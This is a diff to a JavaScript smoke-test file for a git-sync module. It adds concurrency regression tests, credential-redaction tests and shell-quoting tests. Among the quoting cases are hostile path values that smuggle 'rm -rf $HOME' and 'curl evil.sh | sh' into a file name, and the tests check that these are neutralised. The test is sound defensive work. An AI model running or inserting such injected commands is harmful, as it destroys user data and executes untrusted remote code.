@@ -316,7 +316,10 @@ git(deviceA, ["commit", "-m", "A final"]);
 await asyncCheck("sync() on diverged surfaces runbook with cd/git commands", async () => {
   const result = await gitSync.sync({ abrainHome: deviceA });
   if (result.ok) throw new Error(`expected ok=false on diverged`);
-  for (const hint of ["diverged", "cd " + deviceA, "git fetch", "git merge", "git rebase", "/abrain sync"]) {
+  // Note: deviceA is shell-quoted per Round 2 audit fix (opus M2), so we
+  // assert on `cd '<deviceA>'` here. Section 15 has a dedicated test
+  // pinning the exact quoted form.
+  for (const hint of ["diverged", `cd '${deviceA}'`, "git fetch", "git merge", "git rebase", "/abrain sync"]) {
     if (!result.summary.includes(hint)) {
       throw new Error(`expected hint '${hint}' in summary, got: ${result.summary}`);
     }
@@ -387,39 +390,156 @@ check("audit log accumulates one row per op", () => {
 });
 
 // ── 13. single-flight in-process serialization ────────────────────
-console.log("\n[13] single-flight in-process lock");
+console.log("\n[13] single-flight queue serialization");
 await asyncCheck("two concurrent pushAsync calls serialize (no git index.lock contention)", async () => {
-  // Reset to clean state first
   git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
-  // Make one local commit
   fs.writeFileSync(path.join(deviceA, "concurrent.md"), "concurrent\n");
   git(deviceA, ["add", "concurrent.md"]);
   git(deviceA, ["commit", "-m", "concurrent test"]);
 
-  // Fire two pushAsync in parallel. Without single-flight, the second one
-  // could race on .git/index.lock. With single-flight, the second one waits.
   const [r1, r2] = await Promise.all([
     gitSync.pushAsync({ abrainHome: deviceA }),
     gitSync.pushAsync({ abrainHome: deviceA }),
   ]);
 
-  // One must be ok (the first), and the other should be noop (second saw
-  // nothing to push after the first completed). Neither should be a
-  // "failed" with index.lock error.
   const results = [r1.result, r2.result].sort();
   if (results[0] === "failed" || results[1] === "failed") {
     throw new Error(`expected serialized push, got results: ${results.join(",")} (errors: ${r1.error}, ${r2.error})`);
   }
-  // Acceptable combinations: [ok, noop], [noop, noop] (if remote was already synced).
   if (!(results.includes("ok") || results.every((r) => r === "noop"))) {
     throw new Error(`unexpected result combination: ${results.join(",")}`);
   }
 });
 
-// ── Cleanup ────────────────────────────────────────────────────────
-fs.rmSync(tmpDir, { recursive: true, force: true });
+await asyncCheck("3 concurrent pushAsync calls all serialize (gpt #2 TOCTOU regression test)", async () => {
+  // Round 2 audit found that the previous singleFlight had a TOCTOU race:
+  // when 3+ callers all awaited the same prior inflightOp, they each ran
+  // fn() in parallel after the prior resolved. The new tail-chained queue
+  // runs them strictly serially. The previous smoke (2 callers only) didn't
+  // exercise the bug because with 2 callers, the second naturally waited
+  // on the first — the race needs >=3 to manifest.
+  git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
+  fs.writeFileSync(path.join(deviceA, "three-way.md"), "three-way\n");
+  git(deviceA, ["add", "three-way.md"]);
+  git(deviceA, ["commit", "-m", "three-way concurrent"]);
 
-// ── Report ────────────────────────────────────────────────────────
+  const [r1, r2, r3] = await Promise.all([
+    gitSync.pushAsync({ abrainHome: deviceA }),
+    gitSync.pushAsync({ abrainHome: deviceA }),
+    gitSync.pushAsync({ abrainHome: deviceA }),
+  ]);
+
+  const results = [r1.result, r2.result, r3.result];
+  for (const r of [r1, r2, r3]) {
+    if (r.result === "failed" && r.error && /index\.lock/i.test(r.error)) {
+      throw new Error(`single-flight queue regression: index.lock contention in 3-way race. Results: ${JSON.stringify(results)} Errors: ${r.error}`);
+    }
+  }
+  // Exactly one should be 'ok' (the first to actually push); the other two
+  // should be 'noop' (saw nothing to push after the first completed).
+  const okCount = results.filter((r) => r === "ok").length;
+  const noopCount = results.filter((r) => r === "noop").length;
+  if (okCount !== 1 || noopCount !== 2) {
+    throw new Error(`expected exactly 1 ok + 2 noop in 3-way queue, got: ${JSON.stringify(results)}`);
+  }
+});
+
+// [14] PI_ABRAIN_NO_AUTOSYNC contract
+console.log("\n[14] PI_ABRAIN_NO_AUTOSYNC env contract");
+await asyncCheck("git-sync ops still execute when called directly under PI_ABRAIN_NO_AUTOSYNC=1 (env is caller-layer gate)", async () => {
+  // Round 2 audit (deepseek M3): document the contract that git-sync.ts
+  // is policy-neutral. The env var gates AUTO callers (abrain extension
+  // activate, sediment writer post-commit) but not direct API users like
+  // /abrain sync. This smoke pins that contract so a future refactor
+  // doesn't accidentally wire the env check INTO git-sync.ts and break
+  // /abrain sync's intentional manual-override semantics.
+  const prev = process.env.PI_ABRAIN_NO_AUTOSYNC;
+  process.env.PI_ABRAIN_NO_AUTOSYNC = "1";
+  try {
+    const r = await gitSync.pushAsync({ abrainHome: deviceA, timeoutMs: 5000 });
+    if (!["ok", "noop", "skipped", "push_rejected"].includes(r.result)) {
+      throw new Error(`unexpected result under PI_ABRAIN_NO_AUTOSYNC=1: ${r.result} (${r.error})`);
+    }
+  } finally {
+    if (prev === undefined) delete process.env.PI_ABRAIN_NO_AUTOSYNC;
+    else process.env.PI_ABRAIN_NO_AUTOSYNC = prev;
+  }
+});
+
+// [15] Round 2 audit: credential redaction + path quoting
+console.log("\n[15] credential redaction + shell-quoted runbook path (Round 2 audit)");
+check("redactCredentials strips user:pass from https URLs", () => {
+  const cases = [
+    ["https://alice:secret@host.example.com/repo.git", "https://***@host.example.com/repo.git"],
+    ["https://token@host/path",                         "https://***@host/path"],
+    ["http://u:p@host/r",                                "http://***@host/r"],
+    ["git@github.com:user/repo.git",                     "git@github.com:user/repo.git"],
+    ["https://host/no-userinfo.git",                     "https://host/no-userinfo.git"],
+    ["fatal: unable to access 'https://alice:tok@host/x' returned 401", "fatal: unable to access 'https://***@host/x' returned 401"],
+  ];
+  for (const [input, expected] of cases) {
+    const got = gitSync.redactCredentials(input);
+    if (got !== expected) throw new Error(`redactCredentials('${input}') = '${got}', expected '${expected}'`);
+  }
+});
+
+check("shellQuotePath produces single-quoted POSIX-safe argument", () => {
+  const cases = [
+    ["/home/user/.abrain",                            "'/home/user/.abrain'"],
+    ["/path with spaces/.abrain",                     "'/path with spaces/.abrain'"],
+    ["/path/with/'apostrophe'/.abrain",               "'/path/with/'\\''apostrophe'\\''/.abrain'"],
+    ["/tmp/evil\"; rm -rf $HOME; #",                  "'/tmp/evil\"; rm -rf $HOME; #'"],
+    ["/tmp/evil'; curl evil.sh | sh; #",              "'/tmp/evil'\\''; curl evil.sh | sh; #'"],
+  ];
+  for (const [input, expected] of cases) {
+    const got = gitSync.shellQuotePath(input);
+    if (got !== expected) throw new Error(`shellQuotePath('${input}') = '${got}', expected '${expected}'`);
+  }
+});
+
+check("shellQuotePath refuses control characters with safe placeholder", () => {
+  const got = gitSync.shellQuotePath("/path/with\nnewline");
+  if (!got.includes("control characters")) throw new Error(`expected control-char placeholder, got: ${got}`);
+  if (got.includes("\n")) throw new Error(`shellQuotePath leaked newline: ${JSON.stringify(got)}`);
+});
+
+await asyncCheck("sync() runbook contains shell-quoted abrainHome (opus M2 regression test)", async () => {
+  // Re-create divergence so we get the runbook string.
+  fs.writeFileSync(path.join(deviceB, "r2-quote.md"), "r2-quote\n");
+  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
+  git(deviceB, ["add", "r2-quote.md"]);
+  git(deviceB, ["commit", "-m", "r2-quote test"]);
+  git(deviceB, ["push", "origin", "main"]);
+  fs.writeFileSync(path.join(deviceA, "r2-quote-A.md"), "r2-quote-A\n");
+  git(deviceA, ["add", "r2-quote-A.md"]);
+  git(deviceA, ["commit", "-m", "r2-quote-A"]);
+  const result = await gitSync.sync({ abrainHome: deviceA });
+  if (!result.summary.includes("diverged")) throw new Error(`expected diverged, got: ${result.summary}`);
+  // The path must be wrapped in single quotes per shellQuotePath.
+  const expectedQuoted = `'${deviceA}'`;
+  if (!result.summary.includes(expectedQuoted)) {
+    throw new Error(`runbook missing shell-quoted abrainHome ${expectedQuoted}\nGot: ${result.summary}`);
+  }
+});
+
+// [16] _queueDepth() exposed for tests
+console.log("\n[16] _queueDepth() introspection");
+check("_queueDepth returns hasInflight=true after first op flowed through", () => {
+  const depth = gitSync._queueDepth();
+  if (depth.hasInflight !== true) throw new Error(`expected hasInflight=true after >40 ops, got: ${JSON.stringify(depth)}`);
+});
+
+// ── Cleanup ────────────────────────────────────────────────────────
+// Round 2 audit fix (deepseek n3): cleanup is best-effort — if any check
+// above had thrown unhandled (we use try/catch internally so this is
+// theoretical), tmpDir would leak. Wrap to harden.
+try {
+  fs.rmSync(tmpDir, { recursive: true, force: true });
+} catch {
+  // tmpDir cleanup failed; not a smoke failure.
+}
+
+// Report──────────────────────────────────────────────────────
 console.log(`\nTotal: ${totalChecks} checks, ${failures.length} failed`);
 if (failures.length > 0) {
   console.log("\nFailures:");
